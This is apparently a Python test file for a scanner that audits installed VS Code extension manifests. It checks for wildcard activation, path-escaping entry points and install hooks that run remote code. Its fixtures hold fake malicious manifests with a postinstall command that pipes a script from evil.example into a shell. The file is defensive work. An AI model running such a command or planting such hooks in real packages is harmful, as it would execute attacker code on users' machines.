"""Tests for installed IDE extension manifest auditing."""

from pathlib import Path

from skillseraph.checks.extensions import check_extension_manifest
from skillseraph.local_audit import audit_local_ide_configs
from skillseraph.models import Platform

EXT_MANIFEST = Path(".vscode/extensions/some-ext-1.0.0/package.json")


class TestExtensionManifestCheck:
    def test_detects_wildcard_activation(self):
        content = '{"name": "helper", "activationEvents": ["*"]}'
        findings = check_extension_manifest(EXT_MANIFEST, content)
        assert any(f.check == "ext_wildcard_activation" for f in findings)

    def test_detects_lifecycle_hook_execution(self):
        content = (
            '{"name": "helper", "scripts": '
            '{"postinstall": "curl https://evil.example/x.sh | bash"}}'
        )
        findings = check_extension_manifest(EXT_MANIFEST, content)
        assert any(f.check == "ext_lifecycle_remote_exec" for f in findings)

    def test_detects_main_outside_extension_dir(self):
        content = '{"name": "helper", "main": "../../../../tmp/payload.js"}'
        findings = check_extension_manifest(EXT_MANIFEST, content)
        assert any(f.check == "ext_main_path_escape" for f in findings)

    def test_benign_manifest_no_findings(self):
        content = (
            '{"name": "prettier", "main": "./out/extension.js", '
            '"activationEvents": ["onLanguage:python"]}'
        )
        findings = check_extension_manifest(EXT_MANIFEST, content)
        assert findings == []

    def test_non_extension_package_json_skipped(self):
        content = '{"name": "webapp", "activationEvents": ["*"]}'
        findings = check_extension_manifest(Path("package.json"), content)
        assert findings == []


class TestLocalAuditExtensions:
    def test_audit_local_scans_installed_extension_manifests(self, tmp_path: Path):
        manifest = tmp_path / ".vscode" / "extensions" / "evil-ext-0.0.1" / "package.json"
        manifest.parent.mkdir(parents=True)
        manifest.write_text(
            '{"name": "evil-ext", "activationEvents": ["*"], '
            '"scripts": {"postinstall": "curl https://evil.example/x.sh | sh"}}'
        )

        result = audit_local_ide_configs(home=tmp_path)

        assert result.files_scanned == 1
        assert Platform.VSCODE in result.platforms_detected
        checks = {f.check for f in result.findings}
        assert "ext_wildcard_activation" in checks
        assert "ext_lifecycle_remote_exec" in checks
